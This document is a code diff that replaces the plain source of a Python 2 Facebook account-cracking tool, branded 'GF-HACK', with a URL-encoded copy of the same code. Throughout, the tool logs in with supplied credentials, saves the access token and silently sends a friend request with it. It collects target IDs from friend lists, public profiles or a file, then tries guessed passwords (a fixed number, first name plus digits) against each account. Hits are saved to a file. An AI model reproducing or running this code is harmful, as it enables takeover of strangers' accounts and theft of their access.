@@ -1,419 +1,419 @@
-#!/usr/bin/python2
-#coding=utf-8
+%23%21%2Fusr%2Fbin%2Fpython2
+%23coding%3Dutf-8
 
 
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from mechanize import Browser
+import%20os%2Csys%2Ctime%2Cdatetime%2Crandom%2Chashlib%2Cre%2Cthreading%2Cjson%2Curllib%2Ccookielib%2Crequests%2Cmechanize
+from%20multiprocessing.pool%20import%20ThreadPool
+from%20requests.exceptions%20import%20ConnectionError
+from%20mechanize%20import%20Browser
 
 
-reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+reload%28sys%29
+sys.setdefaultencoding%28%27utf8%27%29
+br%20%3D%20mechanize.Browser%28%29
+br.set_handle_robots%28False%29
+br.set_handle_refresh%28mechanize._http.HTTPRefreshProcessor%28%29%2Cmax_time%3D1%29
+br.addheaders%20%3D%20%5B%28%27User-Agent%27%2C%20%27Opera%2F9.80%20%28Android%3B%20Opera%20Mini%2F32.0.2254%2F85.%20U%3B%20id%29%20Presto%2F2.12.423%20Version%2F12.16%27%29%5D
 
 
-def keluar():
-	print "\033[1;96m[!] \x1b[1;91mExit"
-	os.sys.exit()
+def%20keluar%28%29%3A
+%09print%20%22%5C033%5B1%3B96m%5B%21%5D%20%5Cx1b%5B1%3B91mExit%22
+%09os.sys.exit%28%29
 
 
-def acak(b):
-    w = 'ahtdzjc'
-    d = ''
-    for i in x:
-        d += '!'+w[random.randint(0,len(w)-1)]+i
-    return cetak(d)
+def%20acak%28b%29%3A
+%20%20%20%20w%20%3D%20%27ahtdzjc%27
+%20%20%20%20d%20%3D%20%27%27
+%20%20%20%20for%20i%20in%20x%3A
+%20%20%20%20%20%20%20%20d%20%2B%3D%20%27%21%27%2Bw%5Brandom.randint%280%2Clen%28w%29-1%29%5D%2Bi
+%20%20%20%20return%20cetak%28d%29
 
 
-def cetak(b):
-    w = 'ahtdzjc'
-    for i in w:
-        j = w.index(i)
-        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
-    x += '\033[0m'
-    x = x.replace('!0','\033[0m')
-    sys.stdout.write(x+'\n')
+def%20cetak%28b%29%3A
+%20%20%20%20w%20%3D%20%27ahtdzjc%27
+%20%20%20%20for%20i%20in%20w%3A
+%20%20%20%20%20%20%20%20j%20%3D%20w.index%28i%29
+%20%20%20%20%20%20%20%20x%3D%20x.replace%28%27%21%25s%27%25i%2C%27%5C033%5B%25s%3B1m%27%25str%2831%2Bj%29%29
+%20%20%20%20x%20%2B%3D%20%27%5C033%5B0m%27
+%20%20%20%20x%20%3D%20x.replace%28%27%210%27%2C%27%5C033%5B0m%27%29
+%20%20%20%20sys.stdout.write%28x%2B%27%5Cn%27%29
 
 
-def jalan(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(00000.1)
+def%20jalan%28z%29%3A
+%09for%20e%20in%20z%20%2B%20%27%5Cn%27%3A
+%09%09sys.stdout.write%28e%29
+%09%09sys.stdout.flush%28%29
+%09%09time.sleep%2800000.1%29
 
 
-##### LOGO #####
-logo = """ -----------------------------•◈•
-(  __)\\ ____--------------_------------•◈•
-|__(~)    •||•ar noi single thaka----•◈•
-|__\~~) •||•singl der jonno--------------•◈•
-|__(-----\  •◈•------GF-HACK-------•◈•
-|__~~~\ •◈•-----█-------⑦-------█------•◈•
-|__~~~\ •◈•-----█-------⑧-------█------•◈•
-|__~~~\ •◈•-----█-------⑥-------█------•◈•
-\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mOMAR7WR
-\033[1;96mGroup \033[1;93m: \033[1;  SEVENWR
-\033[1;96mFacebook  \033[1;93m: \033[1;  Omar Adnan
-\033[1;96mHack \033[1;93m: \033[1;92mGF
-\033[1;91m======================================="""
+%23%23%23%23%23%20LOGO%20%23%23%23%23%23
+logo%20%3D%20%22%22%22%20-----------------------------%E2%80%A2%E2%97%88%E2%80%A2
+%28%20%20__%29%5C%5C%20____--------------_------------%E2%80%A2%E2%97%88%E2%80%A2
+%7C__%28~%29%20%20%20%20%E2%80%A2%7C%7C%E2%80%A2ar%20noi%20single%20thaka----%E2%80%A2%E2%97%88%E2%80%A2
+%7C__%5C~~%29%20%E2%80%A2%7C%7C%E2%80%A2singl%20der%20jonno--------------%E2%80%A2%E2%97%88%E2%80%A2
+%7C__%28-----%5C%20%20%E2%80%A2%E2%97%88%E2%80%A2------GF-HACK-------%E2%80%A2%E2%97%88%E2%80%A2
+%7C__~~~%5C%20%E2%80%A2%E2%97%88%E2%80%A2-----%E2%96%88-------%E2%91%A6-------%E2%96%88------%E2%80%A2%E2%97%88%E2%80%A2
+%7C__~~~%5C%20%E2%80%A2%E2%97%88%E2%80%A2-----%E2%96%88-------%E2%91%A7-------%E2%96%88------%E2%80%A2%E2%97%88%E2%80%A2
+%7C__~~~%5C%20%E2%80%A2%E2%97%88%E2%80%A2-----%E2%96%88-------%E2%91%A5-------%E2%96%88------%E2%80%A2%E2%97%88%E2%80%A2
+%5C033%5B1%3B91m%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D
+%5C033%5B1%3B96mAuthor%20%20%5C033%5B1%3B93m%3A%20%5C033%5B1%3B92mOMAR7WR
+%5C033%5B1%3B96mGroup%20%5C033%5B1%3B93m%3A%20%5C033%5B1%3B%20%20%20%20%20%20%20%20%20%20%20SEVENWR
+%5C033%5B1%3B96mFacebook%20%20%5C033%5B1%3B93m%3A%20%5C033%5B1%3B%20%20Omar%20Adnan
+%5C033%5B1%3B96mHack%20%5C033%5B1%3B93m%3A%20%5C033%5B1%3B92m%20%20%20%20%20%20%20%20%20%20%20GF
+%5C033%5B1%3B91m%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%22%22%22
 
-def tik():
-	titik = ['.   ','..  ','... ']
-	for o in titik:
-		print("\r\033[1;96m[●] \x1b[1;93mMiss you \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
-
-
-back = 0
-berhasil = []
-cekpoint = []
-oks = []
-id = []
-listgrup = []
-vulnot = "\033[31mNot Vuln"
-vuln = "\033[32mVuln"
-
-os.system("clear")
-print "\033[1;96m ============================================================="
-print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mOMAR7WR
-\033[1;96mGroup \033[1;93m: \033[1;92mSEVENWR
-\033[1;96mFacebook  \033[1;93m: \033[1;92m Omar Adnan 
-\033[1;96mHack \033[1;93m: \033[1;92mGF
-\033[1;91m======================================="""
-print " \x1b[1;93m============================================================="
-
-CorrectUsername = "omaradnan"
-CorrectPassword = "omaradnan"
-
-loop = 'true'
-while (loop == 'true'):
-    username = raw_input("\033[1;96m[☆] \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
-    if (username == CorrectUsername):
-    	password = raw_input("\033[1;96m[☆] \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
-        if (password == CorrectPassword):
-            print "Logged in successfully as " + username
-            loop = 'false'
-        else:
-            print "Wrong Password"
-            os.system('xdg-open https://www.facebook.com/play.itnow')
-    else:
-        print "Wrong Username"
-        os.system('xdg-open https://www.facebook.com/play.itnow')
-
-def login():
-	os.system('clear')
-	try:
-		toket = open('login.txt','r')
-		menu() 
-	except (KeyError,IOError):
-		os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		print('\033[1;96m[☆] \x1b[1;93mSearch your GF \x1b[1;96m[☆]' )
-		id = raw_input('\033[1;96m[+] \x1b[1;93mYour gf name \x1b[1;91m: \x1b[1;92m')
-		pwd = raw_input('\033[1;96m[+] \x1b[1;93mYour gf id link \x1b[1;91m: \x1b[1;92m')
-		tik()
-		try:
-			br.open('https://m.facebook.com')
-		except mechanize.URLError:
-			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
-			keluar()
-		br._factory.is_html = True
-		br.select_form(nr=0)
-		br.form['email'] = id
-		br.form['pass'] = pwd
-		br.submit()
-		url = br.geturl()
-		if 'save-device' in url:
-			try:
-				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
-				x=hashlib.new("md5")
-				x.update(sig)
-				a=x.hexdigest()
-				data.update({'sig':a})
-				url = "https://api.facebook.com/restserver.php"
-				r=requests.get(url,params=data)
-				z=json.loads(r.text)
-				unikers = open("login.txt", 'w')
-				unikers.write(z['access_token'])
-				unikers.close()
-				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				menu()
-			except requests.exceptions.ConnectionError:
-				print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
-				keluar()
-		if 'checkpoint' in url:
-			print("\n\033[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			keluar()
-		else:
-			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email is wrong")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			login()
+def%20tik%28%29%3A
+%09titik%20%3D%20%5B%27.%20%20%20%27%2C%27..%20%20%27%2C%27...%20%27%5D
+%09for%20o%20in%20titik%3A
+%09%09print%28%22%5Cr%5C033%5B1%3B96m%5B%E2%97%8F%5D%20%5Cx1b%5B1%3B93mLoding...%20%5Cx1b%5B1%3B97m%22%2Bo%29%2C%3Bsys.stdout.flush%28%29%3Btime.sleep%281%29
 
 
-def menu():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		os.system('clear')
-		print"\033[1;96m[!] \x1b[1;91mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	try:
-		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
-		a = json.loads(otw.text)
-		nama = a['name']
-		id = a['id']
-	except KeyError:
-		os.system('clear')
-		print"\033[1;96m[!] \033[1;91mIt seems that your account has a checkpoint"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	except requests.exceptions.ConnectionError:
-		print"\033[1;96m[!] \x1b[1;91mThere is no internet connection"
-		keluar()
-	os.system("clear")
-	print logo
-	print 42*"\033[1;96m="
-	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
-	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
-	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start Hacking"
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
-	pilih()
+back%20%3D%200
+berhasil%20%3D%20%5B%5D
+cekpoint%20%3D%20%5B%5D
+oks%20%3D%20%5B%5D
+id%20%3D%20%5B%5D
+listgrup%20%3D%20%5B%5D
+vulnot%20%3D%20%22%5C033%5B31mNot%20Vuln%22
+vuln%20%3D%20%22%5C033%5B32mVuln%22
+
+os.system%28%22clear%22%29
+print%20%22%5C033%5B1%3B96m%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%22
+print%20%20%22%22%22%5C033%5B1%3B91m%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D
+%5C033%5B1%3B96mAuthor%20%20%5C033%5B1%3B93m%3A%20%5C033%5B1%3B92m%20%20%20%20%20%20OMAR7WR
+%5C033%5B1%3B96mGroup%20%5C033%5B1%3B93m%3A%20%5C033%5B1%3B92m%20%20%20%20%20%20%20%20%20%20%20SEVENWR
+%5C033%5B1%3B96mFacebook%20%20%5C033%5B1%3B93m%3A%20%5C033%5B1%3B92m%20Omar%20Adnan%20
+%5C033%5B1%3B96mHack%20%5C033%5B1%3B93m%3A%20%5C033%5B1%3B92m%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20GF
+%5C033%5B1%3B91m%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%22%22%22
+print%20%22%20%5Cx1b%5B1%3B93m%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%22
+
+CorrectUsername%20%3D%20%22omaradnan%22
+CorrectPassword%20%3D%20%22omaradnan%22
+
+loop%20%3D%20%27true%27
+while%20%28loop%20%3D%3D%20%27true%27%29%3A
+%20%20%20%20username%20%3D%20raw_input%28%22%5C033%5B1%3B96m%5B%E2%98%86%5D%20%5Cx1b%5B1%3B93mUsername%20Of%20Tool%20%5Cx1b%5B1%3B96m%3E%3E%3E%3E%20%22%29
+%20%20%20%20if%20%28username%20%3D%3D%20CorrectUsername%29%3A
+%20%20%20%20%09password%20%3D%20raw_input%28%22%5C033%5B1%3B96m%5B%E2%98%86%5D%20%5Cx1b%5B1%3B93mPassword%20Of%20Tool%20%5Cx1b%5B1%3B96m%3E%3E%3E%3E%20%22%29
+%20%20%20%20%20%20%20%20if%20%28password%20%3D%3D%20CorrectPassword%29%3A
+%20%20%20%20%20%20%20%20%20%20%20%20print%20%22Logged%20in%20successfully%20as%20%22%20%2B%20username
+%20%20%20%20%20%20%20%20%20%20%20%20loop%20%3D%20%27false%27
+%20%20%20%20%20%20%20%20else%3A
+%20%20%20%20%20%20%20%20%20%20%20%20print%20%22Wrong%20Password%22
+%20%20%20%20%20%20%20%20%20%20%20%20os.system%28%27xdg-open%20https%3A%2F%2Fwww.facebook.com%2Fplay.itnow%27%29
+%20%20%20%20else%3A
+%20%20%20%20%20%20%20%20print%20%22Wrong%20Username%22
+%20%20%20%20%20%20%20%20os.system%28%27xdg-open%20https%3A%2F%2Fwww.facebook.com%2Fplay.itnow%27%29
+
+def%20login%28%29%3A
+%09os.system%28%27clear%27%29
+%09try%3A
+%09%09toket%20%3D%20open%28%27login.txt%27%2C%27r%27%29
+%09%09menu%28%29%20
+%09except%20%28KeyError%2CIOError%29%3A
+%09%09os.system%28%27clear%27%29
+%09%09print%20logo
+%09%09print%2042%2A%22%5C033%5B1%3B96m%3D%22
+%09%09print%28%27%5C033%5B1%3B96m%5B%E2%98%86%5D%20%5Cx1b%5B1%3B93mSearch%20your%20GF%20%5Cx1b%5B1%3B96m%5B%E2%98%86%5D%27%20%29
+%09%09id%20%3D%20raw_input%28%27%5C033%5B1%3B96m%5B%2B%5D%20%5Cx1b%5B1%3B93mYour%20gf%20name%20%5Cx1b%5B1%3B91m%3A%20%5Cx1b%5B1%3B92m%27%29
+%09%09pwd%20%3D%20raw_input%28%27%5C033%5B1%3B96m%5B%2B%5D%20%5Cx1b%5B1%3B93mYour%20gf%20id%20link%20%5Cx1b%5B1%3B91m%3A%20%5Cx1b%5B1%3B92m%27%29
+%09%09tik%28%29
+%09%09try%3A
+%09%09%09br.open%28%27https%3A%2F%2Fm.facebook.com%27%29
+%09%09except%20mechanize.URLError%3A
+%09%09%09print%22%5Cn%5C033%5B1%3B96m%5B%21%5D%20%5Cx1b%5B1%3B91mThere%20is%20no%20internet%20connection%22
+%09%09%09keluar%28%29
+%09%09br._factory.is_html%20%3D%20True
+%09%09br.select_form%28nr%3D0%29
+%09%09br.form%5B%27email%27%5D%20%3D%20id
+%09%09br.form%5B%27pass%27%5D%20%3D%20pwd
+%09%09br.submit%28%29
+%09%09url%20%3D%20br.geturl%28%29
+%09%09if%20%27save-device%27%20in%20url%3A
+%09%09%09try%3A
+%09%09%09%09sig%3D%20%27api_key%3D882a8490361da98702bf97a021ddc14dcredentials_type%3Dpasswordemail%3D%27%2Bid%2B%27format%3DJSONgenerate_machine_id%3D1generate_session_cookies%3D1locale%3Den_USmethod%3Dauth.loginpassword%3D%27%2Bpwd%2B%27return_ssl_resources%3D0v%3D1.062f8ce9f74b12f84c123cc23437a4a32%27
+%09%09%09%09data%20%3D%20%7B%22api_key%22%3A%22882a8490361da98702bf97a021ddc14d%22%2C%22credentials_type%22%3A%22password%22%2C%22email%22%3Aid%2C%22format%22%3A%22JSON%22%2C%20%22generate_machine_id%22%3A%221%22%2C%22generate_session_cookies%22%3A%221%22%2C%22locale%22%3A%22en_US%22%2C%22method%22%3A%22auth.login%22%2C%22password%22%3Apwd%2C%22return_ssl_resources%22%3A%220%22%2C%22v%22%3A%221.0%22%7D
+%09%09%09%09x%3Dhashlib.new%28%22md5%22%29
+%09%09%09%09x.update%28sig%29
+%09%09%09%09a%3Dx.hexdigest%28%29
+%09%09%09%09data.update%28%7B%27sig%27%3Aa%7D%29
+%09%09%09%09url%20%3D%20%22https%3A%2F%2Fapi.facebook.com%2Frestserver.php%22
+%09%09%09%09r%3Drequests.get%28url%2Cparams%3Ddata%29
+%09%09%09%09z%3Djson.loads%28r.text%29
+%09%09%09%09unikers%20%3D%20open%28%22login.txt%22%2C%20%27w%27%29
+%09%09%09%09unikers.write%28z%5B%27access_token%27%5D%29
+%09%09%09%09unikers.close%28%29
+%09%09%09%09print%20%27%5Cn%5C033%5B1%3B96m%5B%E2%9C%93%5D%20%5Cx1b%5B1%3B92mLogin%20Successful%27
+%09%09%09%09os.system%28%27xdg-open%20https%3A%2F%2Fwww.Facebook.com%2FOmi6t%27%29
+%09%09%09%09requests.post%28%27https%3A%2F%2Fgraph.facebook.com%2Fme%2Ffriends%3Fmethod%3Dpost%26uids%3Dgwimusa3%26access_token%3D%27%2Bz%5B%27access_token%27%5D%29
+%09%09%09%09menu%28%29
+%09%09%09except%20requests.exceptions.ConnectionError%3A
+%09%09%09%09print%22%5Cn%5C033%5B1%3B96m%5B%21%5D%20%5Cx1b%5B1%3B91mThere%20is%20no%20internet%20connection%22
+%09%09%09%09keluar%28%29
+%09%09if%20%27checkpoint%27%20in%20url%3A
+%09%09%09print%28%22%5Cn%5C033%5B1%3B96m%5B%21%5D%20%5Cx1b%5B1%3B91mIt%20seems%20that%20your%20account%20has%20a%20checkpoint%22%29
+%09%09%09os.system%28%27rm%20-rf%20login.txt%27%29
+%09%09%09time.sleep%281%29
+%09%09%09keluar%28%29
+%09%09else%3A
+%09%09%09print%28%22%5Cn%5C033%5B1%3B96m%5B%21%5D%20%5Cx1b%5B1%3B91mPassword%2FEmail%20is%20wrong%22%29
+%09%09%09os.system%28%27rm%20-rf%20login.txt%27%29
+%09%09%09time.sleep%281%29
+%09%09%09login%28%29
 
 
-def pilih():
-	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
-	if unikers =="":
-		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
-		pilih()
-	elif unikers =="1":
-		super()
-	elif unikers =="0":
-		jalan('Token Removed')
-		os.system('rm -rf login.txt')
-		keluar()
-	else:
-		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
-		pilih()
+def%20menu%28%29%3A
+%09os.system%28%27clear%27%29
+%09try%3A
+%09%09toket%3Dopen%28%27login.txt%27%2C%27r%27%29.read%28%29
+%09except%20IOError%3A
+%09%09os.system%28%27clear%27%29
+%09%09print%22%5C033%5B1%3B96m%5B%21%5D%20%5Cx1b%5B1%3B91mToken%20invalid%22
+%09%09os.system%28%27rm%20-rf%20login.txt%27%29
+%09%09time.sleep%281%29
+%09%09login%28%29
+%09try%3A
+%09%09otw%20%3D%20requests.get%28%27https%3A%2F%2Fgraph.facebook.com%2Fme%3Faccess_token%3D%27%2Btoket%29
+%09%09a%20%3D%20json.loads%28otw.text%29
+%09%09nama%20%3D%20a%5B%27name%27%5D
+%09%09id%20%3D%20a%5B%27id%27%5D
+%09except%20KeyError%3A
+%09%09os.system%28%27clear%27%29
+%09%09print%22%5C033%5B1%3B96m%5B%21%5D%20%5C033%5B1%3B91mIt%20seems%20that%20your%20account%20has%20a%20checkpoint%22
+%09%09os.system%28%27rm%20-rf%20login.txt%27%29
+%09%09time.sleep%281%29
+%09%09login%28%29
+%09except%20requests.exceptions.ConnectionError%3A
+%09%09print%22%5C033%5B1%3B96m%5B%21%5D%20%5Cx1b%5B1%3B91mThere%20is%20no%20internet%20connection%22
+%09%09keluar%28%29
+%09os.system%28%22clear%22%29
+%09print%20logo
+%09print%2042%2A%22%5C033%5B1%3B96m%3D%22
+%09print%20%22%5C033%5B1%3B96m%5B%5C033%5B1%3B97m%E2%9C%93%5C033%5B1%3B96m%5D%5C033%5B1%3B93m%20Name%20%5C033%5B1%3B91m%3A%20%5C033%5B1%3B92m%22%2Bnama%2B%22%5C033%5B1%3B97m%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22
+%09print%20%22%5C033%5B1%3B96m%5B%5C033%5B1%3B97m%E2%9C%93%5C033%5B1%3B96m%5D%5C033%5B1%3B93m%20ID%20%20%20%5C033%5B1%3B91m%3A%20%5C033%5B1%3B92m%22%2Bid%2B%22%5Cx1b%5B1%3B97m%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22
+%09print%2042%2A%22%5C033%5B1%3B96m%3D%22
+%09print%20%22%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B92m1%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B93m%20Start%20Hacking%22
+%09print%20%22%5Cx1b%5B1%3B96m%5B%5Cx1b%5B1%3B91m0%5Cx1b%5B1%3B96m%5D%5Cx1b%5B1%3B91m%20Exit%20%20%20%20%20%20%20%20%20%20%20%20%22
+%09pilih%28%29
 
 
-def super():
-	global toket
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\033[1;96m[!] \x1b[1;91mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	os.system('clear')
-	print logo
-	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack From Friend List"
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack From Any Public ID"
-	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File"
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
-	pilih_super()
+def%20pilih%28%29%3A
+%09unikers%20%3D%20raw_input%28%22%5Cn%5C033%5B1%3B97m%20%3E%3E%3E%20%5C033%5B1%3B97m%22%29
+%09if%20unikers%20%3D%3D%22%22%3A
+%09%09print%20%22%5C033%5B1%3B96m%5B%21%5D%20%5Cx1b%5B1%3B91mFill%20in%20correctly%22
+%09%09pilih%28%29
+%09elif%20unikers%20%3D%3D%221%22%3A
+%09%09super%28%29
+%09elif%20unikers%20%3D%3D%220%22%3A
+%09%09jalan%28%27Token%20Removed%27%29
+%09%09os.system%28%27rm%20-rf%20login.txt%27%29
+%09%09keluar%28%29
+%09else%3A
+%09%09print%20%22%5C033%5B1%3B96m%5B%21%5D%20%5Cx1b%5B1%3B91mFill%20in%20correctly%22
+%09%09pilih%28%29
 
-def pilih_super():
-	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
-	if peak =="":
-		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
-		pilih_super()
-	elif peak =="1":
-		os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		jalan('\033[1;96m[✺] \033[1;93mGetting ID \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for s in z['data']:
-			id.append(s['id'])
-	elif peak =="2":
-		os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID \033[1;91m: \033[1;97m")
-		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
-		except KeyError:
-			print"\033[1;96m[!] \x1b[1;91mID Not Found!"
-			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-			super()
-		jalan('\033[1;96m[✺] \033[1;93mGetting IDs \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for i in z['data']:
-			id.append(i['id'])
-	elif peak =="3":
-		os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		try:
-			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;97m')
-			for line in open(idlist,'r').readlines():
-				id.append(line.strip())
-		except IOError:
-			print '\x1b[1;96m[!] \x1b[1;91mFile Not Found'
-			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
-			super()
-	elif peak =="0":
-		menu()
-	else:
-		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
-		pilih_super()
-	
-	print "\033[1;96m[+] \033[1;93mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
-	jalan('\033[1;96m[✺] \033[1;93mStarting \033[1;97m...')
-	titik = ['.   ','..  ','... ']
-	for o in titik:
-		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
-	print
-	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
-	print 42*"\033[1;96m="
-	
-			
-	def main(arg):
-		global cekpoint,oks
-		user = arg
-		try:
-			os.mkdir('out')
-		except OSError:
-			pass
-		try:
-			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-			b = json.loads(a.text)
-			pass1 = ('786786')
-			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-			q = json.load(data)
-			if 'access_token' in q:
-				print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
-				oks.append(user+pass1)
-			else:
-				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
-					cek = open("out/checkpoint.txt", "a")
-					cek.write(user+"|"+pass1+"\n")
-					cek.close()
-					cekpoint.append(user+pass1)
-				else:
-					pass2 = b['first_name']+'12345'
-					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-					q = json.load(data)
-					if 'access_token' in q:
-						print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
-						oks.append(user+pass2)
-					else:
-						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
-							cek = open("out/checkpoint.txt", "a")
-							cek.write(user+"|"+pass2+"\n")
-							cek.close()
-							cekpoint.append(user+pass2)
-						else:
-							pass3 = b['first_name'] + '123'
-							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-							q = json.load(data)
-							if 'access_token' in q:
